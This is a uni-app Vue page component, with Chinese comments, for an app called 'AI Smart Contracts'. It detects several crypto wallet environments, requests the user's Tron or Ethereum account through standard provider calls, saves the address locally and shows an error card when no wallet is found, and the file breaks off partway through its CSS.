<template>
	<view class="connect-container">
		<!-- 背景 -->
		<view class="gradient-bg">
			<view class="overlay-image-container">
				<image class="overlay-image"
					src="https://www.onchainus.net/static/media/img_banner.c2d112845c769829e979.png" mode="aspectFill">
				</image>
			</view>
		</view>

		<!-- 内容区域 -->
		<view class="content-container">
			<!-- 正常连接状态 - 连接检测到的钱包 -->
			<view class="connecting-section" v-if="!showErrorPage && isConnecting">
				<view class="welcome-section">
					<view class="logo-container">
						<view class="app-logo-custom">
							<view class="ai-icon">
								<view class="ai-circle">
									<text class="ai-text">AI</text>
								</view>
								<view class="ai-dots">
									<view class="dot dot1"></view>
									<view class="dot dot2"></view>
									<view class="dot dot3"></view>
								</view>
							</view>
						</view>
					</view>
					<text class="welcome-title">Welcome to AI Smart Contracts</text>
					<text class="welcome-subtitle">Connecting to Wallet...</text>
				</view>
				
				<view class="connect-status">
					<view class="loading-spinner"></view>
					<text class="connecting-text">正在连接钱包...</text>
				</view>
			</view>

			<!-- 无法连接状态 - 显示错误页面 -->
			<view class="error-section" v-if="showErrorPage">
				<view class="error-card">
					<!-- 人物插画 -->
					<view class="character-container">
						<view class="character-avatar">
							<view class="character-head">
								<view class="character-face">
									<view class="character-eyes">
										<view class="eye left-eye"></view>
										<view class="eye right-eye"></view>
									</view>
									<view class="character-mouth"></view>
								</view>
								<view class="character-hair"></view>
								<view class="character-glasses">
									<view class="glass left-glass"></view>
									<view class="glass right-glass"></view>
									<view class="glass-bridge"></view>
								</view>
							</view>
							<view class="character-body">
								<view class="character-suit"></view>
								<view class="character-tie"></view>
								<view class="character-hand">
									<view class="coffee-cup"></view>
								</view>
							</view>
						</view>
					</view>
					
					<view class="error-content">
						<text class="error-title">Unable to connect</text>
						<text class="error-subtitle">This website relies on Ethereum smart contracts to operate, please use a decentralized wallet to access.</text>
						<text class="supported-wallets">Supported wallets: TokenPocket, MetaMask, ImToken, Bifrost, Onchain, Crypto.com</text>
						
						<view class="copy-button" @click="copyLink">
							<text class="copy-text">Copy Link</text>
						</view>
					</view>
				</view>
			</view>

			<!-- 初始加载状态 -->
			<view class="loading-section" v-if="!showErrorPage && !isConnecting">
				<view class="welcome-section">
					<view class="logo-container">
						<view class="app-logo-custom">
							<view class="ai-icon">
								<view class="ai-circle">
									<text class="ai-text">AI</text>
								</view>
								<view class="ai-dots">
									<view class="dot dot1"></view>
									<view class="dot dot2"></view>
									<view class="dot dot3"></view>
								</view>
							</view>
						</view>
					</view>
					<text class="welcome-title">Welcome to AI Smart Contracts</text>
					<text class="welcome-subtitle">Checking network connection...</text>
				</view>
				
				<view class="connect-status">
					<view class="loading-spinner"></view>
					<text class="connecting-text">正在检查网络连接...</text>
				</view>
			</view>
		</view>
	</view>
</template>

<script>
export default {
	data() {
		return {
			isConnecting: false,
			showErrorPage: false,
			walletAddress: '',
			currentUrl: ''
		}
	},
	async onLoad() {
		// 获取当前页面URL
		this.currentUrl = this.getCurrentUrl();
		
		// 等待页面完全加载
		await this.delay(100);
		
		// 检查是否已经连接过钱包
		await this.checkWalletConnection();
	},
	methods: {
		// 检查钱包连接状态
		async checkWalletConnection() {
			// 首先检查本地存储
			const walletAddress = uni.getStorageSync('walletAddress');
			if (walletAddress) {
				// 已连接，直接跳转到首页
				this.navigateToHome();
				return;
			}
			
			// 如果本地存储中没有，检查各种钱包中是否已有活跃连接
			const activeWalletAddress = await this.checkActiveWalletConnection();
			if (activeWalletAddress) {
				// 检测到活跃连接，保存并跳转
				this.saveWalletConnection('Auto-detected', activeWalletAddress);
				this.navigateToHome();
				return;
			}
			
			// 都没有连接，开始连接流程
			this.startConnectionFlow();
		},

		// 检查各种钱包中的活跃钱包连接
		async checkActiveWalletConnection() {
			try {
				console.log('开始检查活跃钱包连接...');
				
				// 检查各种钱包环境
				const walletChecks = [
					{ name: 'TokenPocket', check: () => this.detectTokenPocketEnvironment() },
					{ name: 'MetaMask', check: () => this.detectMetaMaskEnvironment() },
					{ name: 'ImToken', check: () => this.detectImTokenEnvironment() },
					{ name: 'Bifrost', check: () => this.detectBifrostEnvironment() },
					{ name: 'Onchain', check: () => this.detectOnchainEnvironment() },
					{ name: 'Crypto', check: () => this.detectCryptoEnvironment() }
				];
				
				for (const wallet of walletChecks) {
					if (wallet.check()) {
						console.log(`检测到${wallet.name}环境`);
						
						// 尝试检查Tron钱包连接
						const tronAddress = await this.checkTronConnection();
						if (tronAddress) {
							console.log(`发现${wallet.name} Tron钱包连接:`, tronAddress);
							return tronAddress;
						}
						
						// 尝试检查以太坊钱包连接
						const ethAddress = await this.checkEthereumConnection();
						if (ethAddress) {
							console.log(`发现${wallet.name}以太坊钱包连接:`, ethAddress);
							return ethAddress;
						}
					}
				}
				
				console.log('没有找到活跃的钱包连接');
				return null;
			} catch (error) {
				console.log('检查活跃钱包连接失败:', error);
				return null;
			}
		},

		// 检查Tron连接
		async checkTronConnection() {
			try {
				// 检查TokenPocket的Tron钱包
				if (window.tokenpocket && window.tokenpocket.tron) {
					const tronWeb = window.tokenpocket.tron;
					if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
						return tronWeb.defaultAddress.base58;
					}
				}
				
				// 检查TronWeb
				if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
					return window.tronWeb.defaultAddress.base58;
				}
				
				// 检查其他钱包的Tron支持
				if (window.tronLink && window.tronLink.tronWeb) {
					const tronWeb = window.tronLink.tronWeb;
					if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
						return tronWeb.defaultAddress.base58;
					}
				}
				
				return null;
			} catch (error) {
				console.log('检查Tron连接失败:', error);
				return null;
			}
		},

		// 检查以太坊连接
		async checkEthereumConnection() {
			try {
				let ethereum;
				
				// 尝试多种方式获取ethereum对象
				if (window.tokenpocket && window.tokenpocket.ethereum) {
					ethereum = window.tokenpocket.ethereum;
				} else if (window.bifrost) {
					ethereum = window.bifrost;
				} else if (window.onchain) {
					ethereum = window.onchain;
				} else if (window.crypto && window.crypto.ethereum) {
					ethereum = window.crypto.ethereum;
				} else if (window.ethereum) {
					ethereum = window.ethereum;
				} else {
					return null;
				}
				
				// 尝试获取当前连接的账户（不会弹出连接请求）
				const accounts = await ethereum.request({ method: 'eth_accounts' });
				
				if (accounts && accounts.length > 0) {
					return accounts[0];
				}
				
				return null;
			} catch (error) {
				console.log('检查以太坊连接失败:', error);
				return null;
			}
		},

		// 开始连接流程
		async startConnectionFlow() {
			// 延迟一点显示加载状态
			await this.delay(1000);
			
			// 检测所有支持的钱包环境
			const detectedWallet = await this.detectWalletEnvironmentWithRetry();
			
			if (detectedWallet) {
				// 检测到钱包环境，开始连接
				await this.connectDetectedWallet(detectedWallet);
			} else {
				// 没有检测到钱包环境，显示错误页面
				this.showErrorPage = true;
			}
		},

		// 带重试机制的钱包环境检测
		async detectWalletEnvironmentWithRetry() {
			let retryCount = 0;
			const maxRetries = 5;
			
			while (retryCount < maxRetries) {
				const detectedWallet = this.detectWalletEnvironment();
				if (detectedWallet) {
					return detectedWallet;
				}
				
				// 等待一段时间后重试
				await this.delay(500);
				retryCount++;
			}
			
			return null;
		},

		// 检测钱包环境
		detectWalletEnvironment() {
			if (typeof window === 'undefined') {
				return null;
			}
			
			// 按优先级检测各种钱包
			const walletDetectors = [
				{ name: 'TokenPocket', detector: () => this.detectTokenPocketEnvironment() },
				{ name: 'MetaMask', detector: () => this.detectMetaMaskEnvironment() },
				{ name: 'ImToken', detector: () => this.detectImTokenEnvironment() },
				{ name: 'Bifrost', detector: () => this.detectBifrostEnvironment() },
				{ name: 'Onchain', detector: () => this.detectOnchainEnvironment() },
				{ name: 'Crypto', detector: () => this.detectCryptoEnvironment() }
			];
			
			for (const wallet of walletDetectors) {
				if (wallet.detector()) {
					console.log(`检测到${wallet.name}钱包环境`);
					return wallet.name;
				}
			}
			
			return null;
		},

		// 检测TokenPocket环境
		detectTokenPocketEnvironment() {
			if (typeof window === 'undefined') {
				return false;
			}
			
			// 检查多种可能的TokenPocket环境标识
			const hasTokenPocket = window.tokenpocket;
			const hasEthereumWithTokenPocket = window.ethereum && (
				window.ethereum.isTokenPocket || 
				window.ethereum.isTP ||
				window.ethereum.providers?.some(p => p.isTokenPocket || p.isTP)
			);
			const hasTPUserAgent = navigator.userAgent.includes('TokenPocket');
			const hasTronWeb = window.tronWeb && window.tronWeb.isTokenPocket;
			
			return hasTokenPocket || hasEthereumWithTokenPocket || hasTPUserAgent || hasTronWeb;
		},

		// 检测MetaMask环境
		detectMetaMaskEnvironment() {
			if (typeof window === 'undefined') {
				return false;
			}
			
			const hasMetaMask = window.ethereum && window.ethereum.isMetaMask;
			const hasMetaMaskUserAgent = navigator.userAgent.includes('MetaMask');
			const hasMetaMaskProvider = window.ethereum && window.ethereum.providers?.some(p => p.isMetaMask);
			
			console.log('MetaMask环境检测:', {
				hasMetaMask: !!hasMetaMask,
				hasMetaMaskUserAgent: !!hasMetaMaskUserAgent,
				hasMetaMaskProvider: !!hasMetaMaskProvider
			});
			
			return hasMetaMask || hasMetaMaskUserAgent || hasMetaMaskProvider;
		},

		// 检测ImToken环境
		detectImTokenEnvironment() {
			if (typeof window === 'undefined') {
				return false;
			}
			
			const hasImToken = window.ethereum && window.ethereum.isImToken;
			const hasImTokenUserAgent = navigator.userAgent.includes('imToken');
			const hasImTokenProvider = window.ethereum && window.ethereum.providers?.some(p => p.isImToken);
			
			console.log('ImToken环境检测:', {
				hasImToken: !!hasImToken,
				hasImTokenUserAgent: !!hasImTokenUserAgent,
				hasImTokenProvider: !!hasImTokenProvider
			});
			
			return hasImToken || hasImTokenUserAgent || hasImTokenProvider;
		},

		// 检测Bifrost环境
		detectBifrostEnvironment() {
			if (typeof window === 'undefined') {
				return false;
			}
			
			const hasBifrost = window.bifrost || (window.ethereum && window.ethereum.isBifrost);
			const hasBifrostUserAgent = navigator.userAgent.includes('Bifrost');
			const hasBifrostProvider = window.ethereum && window.ethereum.providers?.some(p => p.isBifrost);
			
			console.log('Bifrost环境检测:', {
				hasBifrost: !!hasBifrost,
				hasBifrostUserAgent: !!hasBifrostUserAgent,
				hasBifrostProvider: !!hasBifrostProvider
			});
			
			return hasBifrost || hasBifrostUserAgent || hasBifrostProvider;
		},

		// 检测Onchain环境
		detectOnchainEnvironment() {
			if (typeof window === 'undefined') {
				return false;
			}
			
			const hasOnchain = window.onchain || (window.ethereum && window.ethereum.isOnchain);
			const hasOnchainUserAgent = navigator.userAgent.includes('OnChain') || navigator.userAgent.includes('Onchain');
			const hasOnchainProvider = window.ethereum && window.ethereum.providers?.some(p => p.isOnchain);
			
			console.log('Onchain环境检测:', {
				hasOnchain: !!hasOnchain,
				hasOnchainUserAgent: !!hasOnchainUserAgent,
				hasOnchainProvider: !!hasOnchainProvider
			});
			
			return hasOnchain || hasOnchainUserAgent || hasOnchainProvider;
		},

		// 检测Crypto钱包环境
		detectCryptoEnvironment() {
			if (typeof window === 'undefined') {
				return false;
			}
			
			const hasCrypto = window.crypto && window.crypto.ethereum;
			const hasCryptoUserAgent = navigator.userAgent.includes('Crypto.com') || navigator.userAgent.includes('CryptoWallet');
			const hasCryptoProvider = window.ethereum && window.ethereum.providers?.some(p => p.isCrypto || p.isCryptoWallet);
			
			console.log('Crypto钱包环境检测:', {
				hasCrypto: !!hasCrypto,
				hasCryptoUserAgent: !!hasCryptoUserAgent,
				hasCryptoProvider: !!hasCryptoProvider
			});
			
			return hasCrypto || hasCryptoUserAgent || hasCryptoProvider;
		},

		// 连接检测到的钱包
		async connectDetectedWallet(walletName) {
			this.isConnecting = true;
			
			try {
				// 延迟显示连接状态
				await this.delay(500);
				
				// 根据钱包类型选择连接方法
				switch (walletName) {
					case 'TokenPocket':
						await this.connectWithTokenPocket();
						break;
					case 'MetaMask':
						await this.connectWithMetaMask();
						break;
					case 'ImToken':
						await this.connectWithImToken();
						break;
					case 'Bifrost':
						await this.connectWithBifrost();
						break;
					case 'Onchain':
						await this.connectWithOnchain();
						break;
					case 'Crypto':
						await this.connectWithCrypto();
						break;
					default:
						throw new Error('不支持的钱包类型');
				}
			} catch (error) {
				console.error(`${walletName}连接失败:`, error);
				
				// 显示具体的错误信息
				let errorMessage = '钱包连接失败';
				if (error.message.includes('User rejected')) {
					errorMessage = '用户拒绝连接';
				} else if (error.message.includes('未找到Web3提供者')) {
					errorMessage = '未检测到钱包环境';
				} else if (error.message.includes('用户拒绝连接')) {
					errorMessage = '用户拒绝连接';
				}
				
				uni.showToast({
					title: errorMessage,
					icon: 'none',
					duration: 2000
				});
				
				// 连接失败，显示错误页面
				this.isConnecting = false;
				this.showErrorPage = true;
			}
		},

		// 在TokenPocket环境中连接
		async connectWithTokenPocket() {
			try {
				console.log('开始连接TokenPocket钱包...');
				
				// 尝试连接Tron钱包
				const tronAddress = await this.connectTronWallet();
				if (tronAddress) {
					this.walletAddress = tronAddress;
					this.saveWalletConnection('TokenPocket-Tron', tronAddress);
					
					// 连接成功提示
					uni.showToast({
						title: 'TokenPocket Tron钱包连接成功',
						icon: 'success'
					});
					
					// 跳转到首页
					setTimeout(() => {
						this.navigateToHome();
					}, 1500);
					return;
				}
				
				// 尝试连接以太坊钱包
				const ethAddress = await this.connectEthereumWallet();
				if (ethAddress) {
					this.walletAddress = ethAddress;
					this.saveWalletConnection('TokenPocket-ETH', ethAddress);
					
					// 连接成功提示
					uni.showToast({
						title: 'TokenPocket以太坊钱包连接成功',
						icon: 'success'
					});
					
					// 跳转到首页
					setTimeout(() => {
						this.navigateToHome();
					}, 1500);
					return;
				}
				
				throw new Error('未找到可用的钱包连接');
			} catch (error) {
				console.error('TokenPocket连接详细错误:', error);
				throw error;
			}
		},

		// 连接MetaMask钱包
		async connectWithMetaMask() {
			try {
				console.log('开始连接MetaMask钱包...');
				
				const ethAddress = await this.connectEthereumWallet();
				if (ethAddress) {
					this.walletAddress = ethAddress;
					this.saveWalletConnection('MetaMask', ethAddress);
					
					uni.showToast({
						title: 'MetaMask钱包连接成功',
						icon: 'success'
					});
					
					setTimeout(() => {
						this.navigateToHome();
					}, 1500);
					return;
				}
				
				throw new Error('MetaMask连接失败');
			} catch (error) {
				console.error('MetaMask连接详细错误:', error);
				throw error;
			}
		},

		// 连接ImToken钱包
		async connectWithImToken() {
			try {
				console.log('开始连接ImToken钱包...');
				
				const ethAddress = await this.connectEthereumWallet();
				if (ethAddress) {
					this.walletAddress = ethAddress;
					this.saveWalletConnection('ImToken', ethAddress);
					
					uni.showToast({
						title: 'ImToken钱包连接成功',
						icon: 'success'
					});
					
					setTimeout(() => {
						this.navigateToHome();
					}, 1500);
					return;
				}
				
				throw new Error('ImToken连接失败');
			} catch (error) {
				console.error('ImToken连接详细错误:', error);
				throw error;
			}
		},

		// 连接Bifrost钱包
		async connectWithBifrost() {
			try {
				console.log('开始连接Bifrost钱包...');
				
				// 首先尝试Bifrost专用连接方法
				if (window.bifrost) {
					const accounts = await window.bifrost.request({ method: 'eth_requestAccounts' });
					if (accounts && accounts.length > 0) {
						this.walletAddress = accounts[0];
						this.saveWalletConnection('Bifrost', accounts[0]);
						
						uni.showToast({
							title: 'Bifrost钱包连接成功',
							icon: 'success'
						});
						
						setTimeout(() => {
							this.navigateToHome();
						}, 1500);
						return;
					}
				}
				
				// 回退到以太坊连接
				const ethAddress = await this.connectEthereumWallet();
				if (ethAddress) {
					this.walletAddress = ethAddress;
					this.saveWalletConnection('Bifrost', ethAddress);
					
					uni.showToast({
						title: 'Bifrost钱包连接成功',
						icon: 'success'
					});
					
					setTimeout(() => {
						this.navigateToHome();
					}, 1500);
					return;
				}
				
				throw new Error('Bifrost连接失败');
			} catch (error) {
				console.error('Bifrost连接详细错误:', error);
				throw error;
			}
		},

		// 连接Onchain钱包
		async connectWithOnchain() {
			try {
				console.log('开始连接Onchain钱包...');
				
				// 首先尝试Onchain专用连接方法
				if (window.onchain) {
					const accounts = await window.onchain.request({ method: 'eth_requestAccounts' });
					if (accounts && accounts.length > 0) {
						this.walletAddress = accounts[0];
						this.saveWalletConnection('Onchain', accounts[0]);
						
						uni.showToast({
							title: 'Onchain钱包连接成功',
							icon: 'success'
						});
						
						setTimeout(() => {
							this.navigateToHome();
						}, 1500);
						return;
					}
				}
				
				// 回退到以太坊连接
				const ethAddress = await this.connectEthereumWallet();
				if (ethAddress) {
					this.walletAddress = ethAddress;
					this.saveWalletConnection('Onchain', ethAddress);
					
					uni.showToast({
						title: 'Onchain钱包连接成功',
						icon: 'success'
					});
					
					setTimeout(() => {
						this.navigateToHome();
					}, 1500);
					return;
				}
				
				throw new Error('Onchain连接失败');
			} catch (error) {
				console.error('Onchain连接详细错误:', error);
				throw error;
			}
		},

		// 连接Crypto钱包
		async connectWithCrypto() {
			try {
				console.log('开始连接Crypto钱包...');
				
				// 首先尝试Crypto专用连接方法
				if (window.crypto && window.crypto.ethereum) {
					const accounts = await window.crypto.ethereum.request({ method: 'eth_requestAccounts' });
					if (accounts && accounts.length > 0) {
						this.walletAddress = accounts[0];
						this.saveWalletConnection('Crypto', accounts[0]);
						
						uni.showToast({
							title: 'Crypto钱包连接成功',
							icon: 'success'
						});
						
						setTimeout(() => {
							this.navigateToHome();
						}, 1500);
						return;
					}
				}
				
				// 回退到以太坊连接
				const ethAddress = await this.connectEthereumWallet();
				if (ethAddress) {
					this.walletAddress = ethAddress;
					this.saveWalletConnection('Crypto', ethAddress);
					
					uni.showToast({
						title: 'Crypto钱包连接成功',
						icon: 'success'
					});
					
					setTimeout(() => {
						this.navigateToHome();
					}, 1500);
					return;
				}
				
				throw new Error('Crypto钱包连接失败');
			} catch (error) {
				console.error('Crypto钱包连接详细错误:', error);
				throw error;
			}
		},

		// 连接Tron钱包
		async connectTronWallet() {
			try {
				// 检查TokenPocket的Tron钱包
				if (window.tokenpocket && window.tokenpocket.tron) {
					const tronWeb = window.tokenpocket.tron;
					if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
						return tronWeb.defaultAddress.base58;
					}
				}
				
				// 检查TronWeb
				if (window.tronWeb) {
					if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
						return window.tronWeb.defaultAddress.base58;
					}
					
					// 尝试请求连接
					const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
					if (accounts && accounts.length > 0) {
						return accounts[0];
					}
				}
				
				// 检查TronLink
				if (window.tronLink && window.tronLink.tronWeb) {
					const tronWeb = window.tronLink.tronWeb;
					if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
						return tronWeb.defaultAddress.base58;
					}
				}
				
				return null;
			} catch (error) {
				console.log('Tron钱包连接失败:', error);
				return null;
			}
		},

		// 连接以太坊钱包
		async connectEthereumWallet() {
			try {
				let ethereum;
				
				// 尝试多种方式获取ethereum对象
				if (window.tokenpocket && window.tokenpocket.ethereum) {
					ethereum = window.tokenpocket.ethereum;
				} else if (window.bifrost) {
					ethereum = window.bifrost;
				} else if (window.onchain) {
					ethereum = window.onchain;
				} else if (window.crypto && window.crypto.ethereum) {
					ethereum = window.crypto.ethereum;
				} else if (window.ethereum) {
					ethereum = window.ethereum;
				} else {
					return null;
				}
				
				console.log('使用的以太坊提供者:', ethereum);
				
				// 请求连接账户
				const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
				
				if (accounts.length > 0) {
					return accounts[0];
				}
				
				return null;
			} catch (error) {
				console.log('以太坊钱包连接失败:', error);
				return null;
			}
		},

		// 拉起TokenPocket应用
		async openTokenPocket() {
			try {
				// #ifdef APP-PLUS
				const tokenPocketUrl = `tpoutside://dapp/open?dappUrl=${encodeURIComponent(this.currentUrl)}`;
				plus.runtime.openURL(tokenPocketUrl);
				// 等待用户从TokenPocket返回
				await this.waitForTokenPocketReturn();
				// #endif
				
				// #ifdef H5
				// 在H5环境中，直接显示错误页面，避免深链接问题
				throw new Error('请在移动设备上使用支持的钱包访问');
				// #endif
				
				// #ifdef MP-WEIXIN
				// 小程序环境无法直接打开外部应用，显示错误页面
				throw new Error('小程序环境无法打开钱包应用');
				// #endif
				
			} catch (error) {
				throw error;
			}
		},

		// 等待从TokenPocket返回
		async waitForTokenPocketReturn() {
			return new Promise((resolve, reject) => {
				let checkCount = 0;
				const maxChecks = 30; // 最多检查30次，每次2秒
				
				const checkInterval = setInterval(() => {
					checkCount++;
					
					// 检查是否已经在TokenPocket环境中
					if (this.detectTokenPocketEnvironment()) {
						clearInterval(checkInterval);
						this.connectWithTokenPocket().then(resolve).catch(reject);
						return;
					}
					
					// 检查是否超时
					if (checkCount >= maxChecks) {
						clearInterval(checkInterval);
						reject(new Error('钱包连接超时'));
						return;
					}
				}, 2000);
			});
		},

		// 获取当前URL
		getCurrentUrl() {
			// #ifdef H5
			return window.location.href;
			// #endif
			
			// #ifdef APP-PLUS
			return 'https://ai-smart-contracts.com/app'; // 您的应用URL
			// #endif
			
			// #ifdef MP-WEIXIN
			return 'https://ai-smart-contracts.com/mp'; // 您的小程序URL
			// #endif
		},

		// 复制链接
		copyLink() {
			const linkToCopy = this.currentUrl;
			
			// #ifdef H5
			if (navigator.clipboard) {
				navigator.clipboard.writeText(linkToCopy).then(() => {
					uni.showToast({
						title: '链接已复制',
						icon: 'success'
					});
				}).catch(() => {
					this.fallbackCopyTextToClipboard(linkToCopy);
				});
			} else {
				this.fallbackCopyTextToClipboard(linkToCopy);
			}
			// #endif
			
			// #ifdef APP-PLUS || MP-WEIXIN
			uni.setClipboardData({
				data: linkToCopy,
				success: () => {
					uni.showToast({
						title: '链接已复制',
						icon: 'success'
					});
				}
			});
			// #endif
		},

		// 备用复制方法
		fallbackCopyTextToClipboard(text) {
			const textArea = document.createElement('textarea');
			textArea.value = text;
			document.body.appendChild(textArea);
			textArea.focus();
			textArea.select();
			
			try {
				document.execCommand('copy');
				uni.showToast({
					title: '链接已复制',
					icon: 'success'
				});
			} catch (err) {
				uni.showToast({
					title: '复制失败，请手动复制',
					icon: 'none'
				});
			}
			
			document.body.removeChild(textArea);
		},

		// 保存钱包连接信息
		saveWalletConnection(walletType, address) {
			uni.setStorageSync('walletType', walletType);
			uni.setStorageSync('walletAddress', address);
			uni.setStorageSync('walletConnected', true);
			uni.setStorageSync('connectTime', Date.now());
		},

		// 跳转到首页
		navigateToHome() {
			uni.switchTab({
				url: '/pages/index/index'
			});
		},

		// 延迟函数
		delay(ms) {
			return new Promise(resolve => setTimeout(resolve, ms));
		},

		// 检测是否是移动设备
		isMobileDevice() {
			// #ifdef H5
			const userAgent = navigator.userAgent;
			const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
			return mobileRegex.test(userAgent);
			// #endif
			
			// #ifdef APP-PLUS
			return true;
			// #endif
			
			// #ifdef MP-WEIXIN
			return true;
			// #endif
		}
	}
}
</script>

<style>
.connect-container {
	min-height: 100vh;
	background-color: #f5f5f5;
	position: relative;
}

.gradient-bg {
	position: relative;
	top: 0;
	left: 0;
	right: 0;
	height: 50vh;
	background: linear-gradient(to bottom, #094884, white);
	z-index: 0;
}

.overlay-image-container {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	height: 25vh;
	z-index: 1;
	display: flex;
	justify-content: center;
	align-items: flex-start;
	overflow: hidden;
}

.overlay-image {
	width: 100%;
	height: 100%;
	object-fit: cover;
	object-position: top;
	margin-top: 0;
	display: block;
}

.content-container {
	position: relative;
	z-index: 2;
	margin: 0 30rpx;
	margin-top: -25vh;
	padding: 40rpx;
	background-color: #ffffff;
	border-radius: 20rpx 20rpx 0 0;
	box-shadow: 0 -4rpx 20rpx rgba(0, 0, 0, 0.1);
	min-height: 70vh;
}

.welcome-section {
	text-align: center;
	margin-bottom: 60rpx;
}

.logo-container {
	margin-bottom: 30rpx;
}

.app-logo {
	width: 120rpx;
	height: 120rpx;
}

.app-logo-custom {
	width: 120rpx;
	height: 120rpx;
	display: flex;
	align-items: center;
	justify-content: center;
	margin: 0 auto;
}

.ai-icon {
	position: relative;
	width: 100rpx;
	height: 100rpx;
	display: flex;
	align-items: center;
	justify-content: center;
}

.ai-circle {
	width: 80rpx;
	height: 80rpx;
	background: linear-gradient(135deg, #4A90E2 0%, #357ABD 100%);
	border-radius: 50%;
	display: flex;
	align-items: center;
	justify-content: center;
	box-shadow: 0 8rpx 16rpx rgba(74, 144, 226, 0.3);
	position: relative;
	z-index: 2;
}

.ai-text {
	font-size: 28rpx;
	font-weight: bold;
	color: white;
	text-shadow: 0 2rpx 4rpx rgba(0, 0, 0, 0.2);
}

.ai-dots {
	position: absolute;
	width: 100%;
	height: 100%;
	top: 0;
	left: 0;
	z-index: 1;
}

.dot {
	position: absolute;
	width: 12rpx;
	height: 12rpx;
	background-color: #4A90E2;
	border-radius: 50%;
	animation: pulse 2s infinite;
}

.dot1 {
	top: 10rpx;
	right: 20rpx;
	animation-delay: 0s;
}

.dot2 {
	bottom: 10rpx;
	left: 15rpx;
	animation-delay: 0.7s;
}

.dot3 {
	top: 50%;
	left: 5rpx;
	transform: translateY(-50%);
	animation-delay: 1.4s;
}

@keyframes pulse {
	0%, 100% {
		opacity: 0.3;
		transform: scale(1);
	}
	50% {
		opacity: 1;
		transform: scale(1.2);
	}
}

.welcome-title {
	font-size: 36rpx;
	font-weight: bold;
	color: #333;
	display: block;
	margin-bottom: 20rpx;
}

.welcome-subtitle {
	font-size: 28rpx;
	color: #666;
	display: block;
}

.connect-status {
	text-align: center;
	padding: 40rpx;
	background-color: #f8f9fa;
	border-radius: 15rpx;
	margin-bottom: 40rpx;
}

.loading-spinner {
	width: 60rpx;
	height: 60rpx;
	border: 4rpx solid #f3f3f3;
	border-top: 4rpx solid #4A90E2;
	border-radius: 50%;
	animation: spin 1s linear infinite;
	margin: 0 auto 20rpx;
}

@keyframes spin {
	0% { transform: rotate(0deg); }
	100% { transform: rotate(360deg); }
}

.connecting-text {
	font-size: 28rpx;
	color: #666;
	display: block;
}

/* 错误页面样式 */
.error-section {
	display: flex;
	justify-content: center;
	align-items: center;
	min-height: 60vh;
}

.error-card {
	background: linear-gradient(135deg, #4A90E2 0%, #357ABD 100%);
	border-radius: 30rpx;
	padding: 60rpx 40rpx;
	text-align: center;
	box-shadow: 0 20rpx 40rpx rgba(74, 144, 226, 0.3);
	max-width: 600rpx;
	width: 100%;
}

.character-container {
	margin-bottom: 40rpx;
}

.character-avatar {
	width: 200rpx;
	height: 200rpx;
	position: relative;
	margin: 0 auto;
}

.character-head {
	width: 120rpx;
	height: 120rpx;
	background-color: #fdbcb4;
	border-radius: 50%;
	position: relative;
	margin: 0 auto;
	margin-bottom: 20rpx;
}

.character-face {
	position: absolute;
	top: 50%;
	left: 50%;
	transform: translate(-50%, -50%);
	width: 80rpx;
	height: 80rpx;
}

.character-eyes {
	position: absolute;
	top: 30rpx;
	left: 50%;
	transform: translateX(-50%);
	width: 60rpx;
	height: 20rpx;
}

.eye {
	width: 12rpx;
	height: 12rpx;
	background-color: #333;
	border-radius: 50%;
	position: absolute;
	top: 4rpx;
}

.left-eye {
	left: 8rpx;
}

.right-eye {
	right: 8rpx;
}

.character-mouth {
	position: absolute;
	top: 50rpx;
	left: 50%;
	transform: translateX(-50%);
	width: 24rpx;
	height: 12rpx;
	border: 2rpx solid #333;
	border-top: none;
	border-radius: 0 0 24rpx 24rpx;
}

.character-hair {
	position: absolute;
	top: -10rpx;
	left: 50%;
	transform: translateX(-50%);
	width: 100rpx;
	height: 40rpx;
	background-color: #8B4513;
	border-radius: 50rpx 50rpx 0 0;
}

.character-glasses {
	position: absolute;
	top: 25rpx;
	left: 50%;
	transform: translateX(-50%);
	width: 80rpx;
	height: 30rpx;
}

.glass {
	width: 30rpx;
	height: 30rpx;
	border: 3rpx solid #333;
	border-radius: 50%;
	position: absolute;
	background-color: rgba(255, 255, 255, 0.3);
}

.left-glass {
	left: 0;
}

.right-glass {
	right: 0;
}

.glass-bridge {
	position: absolute;
	top: 15rpx;
	left: 50%;
	transform: translateX(-50%);
	width: 20rpx;
	height: 3rpx;
	background-color: #333;
}

.character-body {
	width: 140rpx;
	height: 100rpx;
	position: relative;
	margin: 0 auto;
}

.character-suit {
	width: 100rpx;
	height: 80rpx;
	background-color: #2C3E50;
	position: absolute;
	top: 0;
	left: 50%;
	transform: translateX(-50%);
	border-radius: 8rpx;
}

.character-tie {
	width: 16rpx;
	height: 60rpx;
	background-color: #E74C3C;
	position: absolute;
	top: 10rpx;
	left: 50%;
	transform: translateX(-50%);
	border-radius: 0 0 8rpx 8rpx;
}

.character-hand {
	position: absolute;
	top: 20rpx;
	right: -10rpx;
	width: 40rpx;
	height: 40rpx;
}

.coffee-cup {
	width: 24rpx;
	height: 32rpx;
	background-color: #8B4513;
	border-radius: 0 0 8rpx 8rpx;
	position: relative;
}

.coffee-cup::before {
	content: '';
	position: absolute;
	top: 8rpx;
	right: -8rpx;
	width: 12rpx;
	height: 16rpx;
	border: 2rpx solid #8B4513;
	border-left: none;
	border-radius: 0 8rpx 8rpx 0;
}

.coffee-cup::after {
	content: '';
	position: absolute;
	top: 2rpx;
	left: 2rpx;
	right: 2rpx;
	height: 6rpx;
	background-color: #654321;
	border-radius: 4rpx 4rpx 0 0;
}

.error-content {
	color: white;
}

.error-title {
	font-size: 48rpx;
	font-weight: bold;
	color: white;
	display: block;
	margin-bottom: 30rpx;
}

.error-subtitle {
	font-size: 28rpx;
	color: rgba(255, 255, 255, 0.9);
	line-height: 1.6;
	display: block;
	margin-bottom: 30rpx;
}

.supported-wallets {
	font-size: 24rpx;
	color: rgba(255, 255, 255, 0.8);
	line-height: 1.4;
	display: block;
	margin-bottom: 60rpx;
	font-style: italic;
}

.copy-button {
	background-color: rgba(255, 255, 255, 0.2);
	border: 2rpx solid rgba(255, 255, 255, 0.3);
